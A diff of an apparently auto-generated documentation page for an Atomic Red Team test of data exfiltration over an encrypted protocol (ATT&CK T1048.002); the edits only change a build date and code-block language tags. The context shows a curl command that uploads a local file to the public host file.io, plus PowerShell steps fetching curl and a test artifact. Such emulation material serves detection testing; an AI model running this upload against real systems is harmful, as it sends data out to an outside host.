@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1048.002"
 attack_technique_name: "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0"
@@ -58,13 +58,13 @@ Curl must be installed on system.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path #{curl_path}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
 Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
@@ -75,13 +75,13 @@ Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-8.4.0_6-win64-mingw
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{input_file}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{input_file}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact" -OutFile "#{input_file}"
 ```
@@ -93,7 +93,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 #{curl_path} -k -F "file=@#{input_file}" https://file.io/
 ```
 
